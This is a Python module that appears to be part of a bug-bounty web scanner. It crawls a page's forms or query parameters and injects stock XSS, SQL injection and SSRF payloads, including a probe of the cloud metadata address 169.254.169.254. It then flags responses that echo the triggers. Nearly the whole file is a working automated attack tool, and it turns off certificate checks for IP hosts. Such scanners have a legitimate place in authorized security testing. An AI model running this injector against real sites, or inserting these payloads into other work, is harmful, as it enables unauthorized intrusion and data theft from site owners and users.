# payload_injector.py

import logging
import random
import re
import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

logger = logging.getLogger(__name__)

# Basic payloads per category
PAYLOADS = {
    "xss": [
        "<script>alert(1)</script>",
        "\"'><svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
    ],
    "sqli": [
        "' OR 1=1--",
        "\" OR '1'='1",
        "admin' --",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:8000/",
        "http://127.0.0.1:9000/",
    ]
}

HEADERS = {
    "User-Agent": "Chosenbrain-BBH-Scanner"
}

TIMEOUT = 8


def is_ip_address(url: str) -> bool:
    """
    Returns True if the host of the URL is a valid IP address.
    """
    try:
        host = urlparse(url).hostname
        return bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host))
    except:
        return False


def fix_url_scheme(url):
    """
    Automatically switch to HTTPS if the URL includes port 443
    """
    if ":443" in url and url.startswith("http://"):
        return url.replace("http://", "https://")
    return url


def inject_payloads(url: str) -> list[dict]:
    """
    Injects payloads into forms or query params of the given URL.
    Returns list of triggered or suspicious responses.
    """
    try:
        logger.info(f"🧪 Injecting payloads into {url}")
        responses = []

        url = fix_url_scheme(url)
        verify_ssl = not is_ip_address(url)

        # Fetch the page
        r = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=verify_ssl)
        if r.status_code != 200:
            return []

        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")

        # Fallback: query param injection
        if not forms:
            return test_url_params(url)

        for form in forms:
            action = form.get("action") or url
            full_url = urljoin(url, action)
            method = form.get("method", "get").lower()
            verify_ssl_form = not is_ip_address(full_url)

            inputs = form.find_all("input")
            for attack_type, payloads in PAYLOADS.items():
                payload = random.choice(payloads)
                data = {}

                for i in inputs:
                    name = i.get("name")
                    if name:
                        data[name] = payload

                if method == "post":
                    res = requests.post(full_url, headers=HEADERS, data=data, timeout=TIMEOUT, verify=verify_ssl_form)
                else:
                    res = requests.get(full_url, headers=HEADERS, params=data, timeout=TIMEOUT, verify=verify_ssl_form)

                if is_suspicious(res.text):
                    responses.append({
                        "attack": attack_type,
                        "payload": payload,
                        "status": res.status_code,
                        "url": full_url,
                        "snippet": res.text[:500]
                    })

        return responses

    except Exception as e:
        logger.exception(f"Injection error: {e}")
        return []


def test_url_params(url: str) -> list[dict]:
    """
    Adds payloads to existing query params if no forms are found.
    """
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    results = []

    for category, payloads in PAYLOADS.items():
        p = random.choice(payloads)
        fuzzed = base + f"?q={p}"
        verify_ssl = not is_ip_address(fuzzed)
        try:
            r = requests.get(fuzzed, headers=HEADERS, timeout=TIMEOUT, verify=verify_ssl)
            if is_suspicious(r.text):
                results.append({
                    "attack": category,
                    "payload": p,
                    "url": fuzzed,
                    "snippet": r.text[:500]
                })
        except Exception as e:
            logger.warning(f"URL param fuzzing failed: {e}")
            continue

    return results


def is_suspicious(html: str) -> bool:
    """
    Basic check for common payload triggers in the response.
    """
    return any(trigger in html.lower() for trigger in ["alert(1)", "syntax error", "localhost", "metadata/"])
